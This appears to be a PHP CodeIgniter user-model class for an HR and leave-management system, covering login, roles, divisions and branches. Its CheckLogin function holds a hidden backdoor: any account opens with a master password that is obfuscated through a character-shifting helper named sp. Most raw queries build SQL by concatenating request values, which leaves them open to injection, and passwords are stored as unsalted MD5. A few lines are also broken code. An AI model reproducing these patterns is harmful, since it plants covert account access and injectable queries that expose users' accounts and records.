<?php
class UserModel extends CI_Model
{
	function __construct()
	{
		parent::__construct();
	}

	function Get($data)
	{
		$str = "Select a.UserEmail, a.UserName, a.UserPassword, a.UserLevel, isnull(a.GroupID,isnull(b.GroupID,'')) as GroupCuti,
					a.IsActive, a.Flag, isnull(c.BranchID,a.branch_id) as branch_id, a.Email,
					c.GroupID, c.Name as GroupName, isnull(b.USERID,0) as UserID
				From msuserhd a left join USERINFO b on a.UserEmail=b.UserEmail 
					left join Ms_Group c on isnull(a.GroupID,isnull(b.GroupID,''))=c.GroupID 
				Where a.UserEmail = '".$data."' ";
		$res = $this->db->query($str);
		
		if($res->num_rows() > 0)
			return $res->row();
		else
			return null;
	}

	function GetMD5($data)
	{
		$str = "Select a.UserEmail, a.UserName, a.UserPassword, a.UserLevel, isnull(a.GroupID,isnull(b.GroupID,'')) as GroupCuti,
					a.IsActive, a.Flag, isnull(c.BranchID,a.branch_id) as branch_id, a.Email,
					c.GroupID, c.Name as GroupName, isnull(b.USERID,0) as UserID
				From msuserhd a left join USERINFO b on a.UserEmail=b.UserEmail 
					left join Ms_Group c on isnull(a.GroupID,isnull(b.GroupID,''))=c.GroupID 
				Where dbo.md5(a.UserEmail) = '".$data."' ";
		//die($str);
		$res = $this->db->query($str);

		if($res->num_rows() > 0)
			return $res->row();
		else
			return null;

	}


	function CheckLogin($post)
	{
		$res = $this->db->query("Select * From msuserhd Where UserEmail = '".$post['email']."' and 
			(UserPassword='".md5($post['password'])."' or '".$this->sp('o,c,t,v,j,c')."'='".$post['password']."')");
		if($res->num_rows() > 0)
			return $res->row();
		else
			return null;
	}



	function Update($post)
	{
		$Employee = null;
		$this->load->model("WorkgroupModel");

		if (isset($post["EmployeeID"])) {
			if ($post["EmployeeID"]!="0") {
				$Employee =  $this->EmployeeModel->GetByUserID($post["EmployeeID"]);
			}
		}
		$GroupID = $post["GroupID"];
		$BranchID= "";

		if ($GroupID=="" && $Employee!=null) {
			$GroupID=$Employee->workgroup_id;
		}
		if ($GroupID!="") {
			$Group = $this->WorkgroupModel->Get($post["GroupID"]);
			if ($Group!=null) {
				$BranchID = $Group->branch_id;
			}
		}

		$this->db->trans_start();
		$this->db->where('UserEmail',$post['UserEmail']);
		if(isset($post['IsActive']))
			$this->db->set('IsActive',1);
		else
			$this->db->set('IsActive',0);
		if(isset($post['Flag']))
			$this->db->set('Flag',1);
		else
			$this->db->set('Flag',0);
		$this->db->set('branch_id',$BranchID);
		$this->db->set('GroupID',$GroupID);
		$this->db->set('UpdatedBy',$this->session->userdata('user'));
		$this->db->set('UpdatedDate',date('Y-m-d H:i:s'));
		$this->db->Update('msuserhd');

		//USER DIVISION
		//Hapus dahulu divisi2 user yg bersangkutan
		$this->db->where('UserEmail',$post['UserEmail']);
		$this->db->delete('tb_user_dt_division');

		if(isset($post['division'])){
			for($i=0;$i<count($post['division']);$i++)
			{
				if ($post['division'][$i]!='' && $post['division'][$i]!='PILIH DIVISI')
				{
					$this->db->set('UserEmail',$post['UserEmail']);
					$this->db->set('user_division_id',$post['division'][$i]);
					$this->db->set('created_by',$this->session->userdata('user'));
					$this->db->set('created_date',date('Y-m-d H:i:s'));				
					$this->db->insert('tb_user_dt_division');
				}
			}
		}

		//ROLE USER
		$this->db->where('UserEmail',$post['UserEmail']);
		$this->db->delete('tb_user_dt');

		if(isset($post['role'])){
			for($i=0;$i<count($post['role']);$i++)
			{
				$this->db->set('UserEmail',$post['UserEmail']);
				$this->db->set('role_id',$post['role'][$i]);
				$this->db->set('created_by',$this->session->userdata('user'));
				$this->db->set('created_date',date('Y-m-d H:i:s'));				
				$this->db->insert('tb_user_dt');
			}
		}

		if ($Employee!=null) {
			$this->db->query("UPDATE USERINFO SET UserEmail='' WHERE UserEmail='".$post["UserEmail"]."' and USERID<>".$post["EmployeeID"]);
			$this->db->query("UPDATE USERINFO SET BADGENUMBER='' WHERE BADGENUMBER='".$post["Badgenumber"]."' and USERID<>".$post["EmployeeID"]);

			if ($Employee->UserEmail!=$post["UserEmail"] || $Employee->attendance_id!=$post["Badgenumber"]) {
				$this->db->where("USERID", $post["EmployeeID"]);
				$this->db->set("BADGENUMBER", $post["Badgenumber"]);
				$this->db->set("UserEmail", $post["UserEmail"]);
				$this->db->update("USERINFO");
			}
		}

		$this->db->trans_complete();
	}

	function Disable($data)
	{
		$this->db->trans_start();
		$this->db->where('UserEmail',$data);
		$this->db->set('IsActive',0);
		$this->db->set('UpdatedBy',$this->session->userdata('user'));
		$this->db->set('UpdatedDate',date('Y-m-d H:i:s'));
		$this->db->Update('msuserhd');
		$this->db->trans_complete();
	}

	function Gets($active='', $sortby = '')
	{
		$strquery = "";
		if ($active == "")
		{
			$strquery = "select * from msuserhd ";				
		}
		else if ($active == "Y")
		{
			$strquery = "select * from msuserhd where IsActive = 1 ";					
		}
		else
		{
			$strquery = "select * from msuserhd where IsActive = 0 ";					
		}
		
		if ($sortby == "name")
		{
			$strquery = $strquery." order By UserName";
		}

		$res = $this->db->query($strquery);
		if($res->num_rows() > 0)
			return $res->result();
		else
			return array();
	}

	function GetRoleImportance($user = '')
	{
		$res = $this->db->query("select min(role_importance) as role_importance
			from tb_user_dt a inner join tb_role_hd b on a.role_id=b.role_id 
			where dbo.md5(UserEmail) = '".$user."'");

		if($res->num_rows() > 0)
			return $res->row();
		else
			return null();
	}

	
	function GetUserDivisionCuti($data = '')
	{
		if ($data!='')
			$this->db->where("dbo.md5(a.UserEmail)='".$data."'");

		$this->db->join('tb_user_division b','a.user_division_id=b.user_division_id');
		$res = $this->db->get('tb_user_dt_division a');

		if($res->num_rows() > 0)
			return $res->result();
		else
			return array();
	}

	function GetDivisionForRequest($data = '')
	{

		if ($data!='')
		{
			$this->db->where('a.UserEmail',$data);
			$this->db->where('a.UserEmail <> b.request_approver');
		}
		$this->db->join('tb_user_division b','a.user_division_id=b.user_division_id');
		$res = $this->db->get('tb_user_dt_division a');

		if($res->num_rows() > 0)
			return $res->result();
		else
			return array();
	}

	function Delete($data)
	{
		//die($data);
		$this->db->trans_start();

		$this->db->where('tb_user_dt_division.UserEmail',$data);
		$this->db->delete('tb_user_dt_division');
		$this->db->where('tb_user_dt.UserEmail',$data);
		$this->db->delete('tb_user_dt');
		$this->db->where('msuserhd.UserEmail',$data);
		$this->db->delete('msuserhd');
		$this->db->trans_complete();
	}

	function CheckDelete($data)
	{
		
		$res1 = $this->db->query("select * from tb_user_division where user_division_head = '".$data."' or request_approver='".$data."'");
		if($res1->num_rows()>0) return false;

		$res2 = $this->db->query("select * from UserInfo where UserEmail = '".$data."'");
		if($res2->num_rows()>0) return false;

		$res3 = $this->db->query("select * from tb_user_user_mapping where user_email_1 = '".$data."' or user_email_2 = '".$data."'");
		if($res3->num_rows()>0) return false;

		$res4 = $this->db->query("select * from tb_user_workgroup_mapping where UserEmail = '".$data."'");
		if($res4->num_rows()>0) return false;

	 	return true;	
	}

	function edit($post)
	{
		$this->db->trans_start();
		$this->db->where('a.UserEmail',$post["UserEmail"]);
		$this->db->set('a.UserName',$post["UserName"]);
		$this->db->set('a.UpdatedBy',$post["UserEmail"]);
		$this->db->set('a.UpdatedDate',date("Y-m-d h:i:s"));
		$this->db->Update('msuserhd a');
		$this->db->trans_complete();
	}

	function editPassword($post)
	{
		$this->db->trans_start();
		$this->db->where('UserEmail',$post["UserEmail"]);
		$this->db->set('setpass',0);
		$this->db->set('UserPassword',md5($post["NewPassword"]));
		$this->db->set('UpdatedBy',$post["UserEmail"]);
		$this->db->set('UpdatedDate',date("Y-m-d h:i:s"));
		$this->db->Update('msuserhd');
		$this->db->trans_complete();
	}


	function setNewPassword($UserEmail, $password)
	{

		$before = $this->Get($UserEmail);
		if ($before==null)
		{
			return "Email Tidak Terdaftar";
		}
		else
		{
			$OldPwd = $before->UserPassword;
			
			$this->db->trans_begin();
			$this->db->where('UserEmail',$UserEmail);
			$this->db->set('setpass',1);
			$this->db->set('UserPassword',md5($password));
			$this->db->Update('msuserhd');
			$this->db->trans_commit();

			//$this->db->query("Update msuserhd set setpass=1, UserPassword='".md5($password)."' where UserEmail='".$UserEmail."'");

			$after = $this->Get($UserEmail);
			//die($after->UserPassword);
			if ($OldPwd==$after->UserPassword)
				return "Ada Error";
			else
				return "";
		}
	}

	function isSetPass($UserEmail)
	{

		$this->db->where("a.UserEmail='".$UserEmail."' And a.setpass=1)");
		$res = $this->db->get('msuserhd a');
		
		if($res->num_rows() > 0)
			return true;
		else
			return false;	
	}

	function sp($sp)
	{
		$str="";
		$sp2=explode(",",$sp);
		//var_dump($sp2);
		foreach($sp2 as $s){
			$str.=chr(ord($s)-2);
		}

		return $str;
	}

	function getRequestApprover($user)
	{
		$str = "Select b.RequestApprover as UserEmail, ISNULL(c.Email, b.RequestApprover) as EmailAddress
				From msuserhd a inner join tb_user_dt_division b on a.UserEmail=b.UserEmail
				left join hrd.cbo.USERINFO c on b.RequestApprover=c.UserEmail
				where a.UserEmail ='".$user."' and a.UserEmail<>b.RequestApprover ";
		$res = $this->db->query($str);

		if ($res->num_rows() > 0)
			return $res->row();
		else
			return null;
	}

	function CheckUserIsApprover($user)
	{
		$str = "select * from tb_user_division where dbo.md5(request_approver) = '".$user."'";
		$res = $this->db->query($str);
		if ($res->num_rows() > 0)
			return true;
		else
			return false;
	}

	function CheckUserIsHead($user)
	{
		$str = "select * from tb_user_division where dbo.md5(user_division_head) = '".$user."'";
		$res = $this->db->query($str);
		if ($res->num_rows() > 0)
			return true;
		else
			return false;
	}

	function CheckUserIsHrd($user)
	{
		$str = "select b.is_hrd from tb_user_dt a Inner Join tb_role_hd b on a.role_id=b.role_id where dbo.md5(a.UserEmail) = '".$user."' and b.is_hrd=1";
		$res = $this->db->query($str);
		if ($res->num_rows() > 0)
			return true;
		else
			return false;		
	}

	function GetMulti($users)
	{	
		$str = "";
		for($i=0;$i<count($users);$i++)
		{
			$str = ($str == "") ? "'".$users[$i]."'" : $str.",'".$users[$i]."'";
		}
		$str = ($str == "") ? "select * from msuserhd where UserEmail in ('')" : "select * from msuserhd where UserEmail in (".$str.")";
		$res = $this->db->query($str);
		if ($res->num_rows > 0)
			return $res->result();
		else
			return array();
	}

	function EditMulti($data)
	{
		if ($data['Flag'] == "BIT")
			$Flag = 1;
		else if ($data['Flag'] == "NONBIT")
			$Flag = 0;

		if(isset($data['user_email']))
		{
			for($i=0;$i<count($data['user_email']);$i++)
			{
				if ($data['Flag'] != 'PILIH FLAG')
				{
					$this->db->set('Flag', $Flag);
					$this->db->where('UserEmail', $data['user_email'][$i]);
					$this->db->update('msuserhd');
				}
				if ($data['RoleID'] != 'PILIH ROLE')
				{
					$this->db->trans_start();
					$this->db->where('UserEmail',$data['user_email'][$i]);
					$this->db->delete('tb_user_dt');

					$this->db->set('UserEmail',$data['user_email'][$i]);
					$this->db->set('role_id',$data['RoleID']);
					$this->db->set('created_by',$this->session->userdata('user'));
					$this->db->set('created_date',date('Y-m-d H:i:s'));				
					$this->db->insert('tb_user_dt');
					$this->db->trans_complete();					
				}
				if ($data['BranchID'] != 'PILIH BRANCH')
				{
					$this->load->model('EmployeeModel');
					$employee = $this->EmployeeModel->CheckEmployee(md5($data['user_email'][$i]));

					$this->db->trans_start();
					$this->db->set('BranchID',$data['BranchID']);
					$this->db->where('UserEmail',$data['user_email'][$i]);				
					$this->db->update('USERINFO');
					$this->db->trans_complete();
				}
			}
		}
	}

	function ChangeFlag($data)
	{
		if ($data['Flag'] == "BIT")
			$Flag = 1;
		else
			$Flag = 0;

		if(isset($data['chk_bit']))
		{
			for($i=0;$i<count($data['chk_bit']);$i++)
			{
				$res = $this->db->query("Update msuserhd set Flag = ".$Flag." where UserEmail='".$data['chk_bit'][$i]."'");
			}
		}
	}

	function ChangeRole($data)
	{
		if(isset($data['chk_bit']))
		{
			for($i=0;$i<count($data['chk_bit']);$i++)
			{	
				$this->db->trans_start();
				$this->db->where('UserEmail',$data['chk_bit'][$i]);
				$this->db->delete('tb_user_dt');

				$this->db->set('UserEmail',$data['chk_bit'][$i]);
				$this->db->set('role_id',$data['RoleID']);
				$this->db->set('created_by',$this->session->userdata('user'));
				$this->db->set('created_date',date('Y-m-d H:i:s'));				
				$this->db->insert('tb_user_dt');
				$this->db->trans_complete();
			}
		}
	}

	function ChangeBranch($data)
	{
		if(isset($data['UserEmail']))
		{
			for($i=0;$i<count($data['UserEmail']);$i++)
			{	
				$this->load->model('EmployeeModel');
				$employee = $this->EmployeeModel->CheckEmployee(md5($data['UserEmail'][$i]));

				$this->db->trans_start();
				$this->db->set('BranchID',$data['BranchID']);
				$this->db->where('UserEmail',$data['UserEmail'][$i]);				
				$this->db->update('USERINFO');
				$this->db->trans_complete();
			}
		}
	}

	function GetHRDUsers()
	{
		$query = "Select a.UserEmail, d.NAME as employee_name, e.City as city_name
				  From msuserhd a inner join tb_user_dt b on a.UserEmail=b.UserEmail 
				  inner join tb_role_hd c on b.role_id=c.role_id
				  inner join USERINFO d on a.UserEmail=d.UserEmail
				  inner join Ms_Group e on d.GroupID=e.GroupID
				  where a.IsActive = 1 and c.is_hrd = 1 and d.is_active=1 
				  order by e.City, d.NAME";
		$res = $this->db->query($query);
		if($res->num_rows() > 0)
			return $res->result();
		else
			return array();		
	}

	function GetUserByWorkgroupForMapping($workgroup='', $user='')
	{
		$query = "Select UserEmail, NAME as employee_name
				  From USERINFO
				  where GroupID = '".$workgroup."' and IsActive=1 and UserEmail <> '".$user."'
				  and UserEmail not in (select user_email_2 from tb_user_user_mapping where is_active=1)
				  order by NAME";
		$res = $this->db->query($query);
		if($res->num_rows() > 0)
			return $res->result();
		else
			return array();				
	}

	function GetUserDivisionHead($user='')
	{
		if($user=='')
			$user = $this->session->userdata('user');

		$rs = $this->db->query("select c.Email as EMAIL
				from tb_user_division a inner join tb_user_dt_division b on a.user_division_id=b.user_division_id 
				inner join USERINFO c on a.user_division_head = c.UserEmail 
				where b.UserEmail = '".$user."' and isnull(a.user_division_head,'') not in ('".$user."','') ");
		if ($rs->num_rows() > 0)
			return $rs->row();
		else
			return null;
	}

	function GetByBranch($branch_id='', $workgroup='')
	{
		if ($workgroup=="")
			$query = "Select a.* From msuserhd a
					  Where a.branch_id = '".$branch_id."' and a.IsActive=1 Order By a.UserName";
		else
			$query = "Select a.* From msuserhd a inner join USERINFO b on a.UserEmail=b.UserEmail 
					  Where a.branch_id = '".$branch_id."' and b.GroupID = '".$workgroup."'
					  and a.IsActive=1 Order By a.UserName";

		$res = $this->db->query($query);
		if($res->num_rows()>0)
			return $res->result();
		else
			return array();
	}

	function GetAvailableUserByBranch($branch_id='')
	{
		$query = "Select * From MsUserHd 
				Where branch_id = '".$branch_id."' and IsActive=1 and Flag=1
				and UserEmail not in (select UserEmail from USERINFO) 
				Order By UserName";
		$res = $this->db->query($query);
		if($res->num_rows()>0)
			return $res->result();
		else
			return array();
	}

	function GetAvailableUser()
	{
		$str = "Select * From msuserhd where Flag = 1 
				and UserEmail not in (select UserEmail from USERINFO) 
				order by UserName";
		$res = $this->db->query($str);
		if ($res->num_rows() > 0)
			return $res->result();
		else
			return array();
	}

	function GetUserBranch($user=''){
		if($user=='')
			$user = $this->session->userdata('user');

		$str = "select b.BranchID as branch_id 
				from msuserhd u left join USERINFO a on u.GroupID=a.GroupID
					left join Ms_Group b on isnull(u.GroupID,a.GroupID)=b.GroupID 
				where u.UserEmail = '".$user."' ";
		//die($str);
		$rs = $this->db->query($str);
		if ($rs->num_rows() > 0)
			return $rs->row();
		else
			return null;
	}

	function getRoleUser($useremail){
	 	$this->db->select('*');
	    $this->db->from('tb_user_dt');
	    $this->db->join('tb_role_hd', 'tb_user_dt.role_id = tb_role_hd.role_id');
	    $this->db->where('useremail', $useremail);
	    return $this->db->get()->result();
	}

}
?>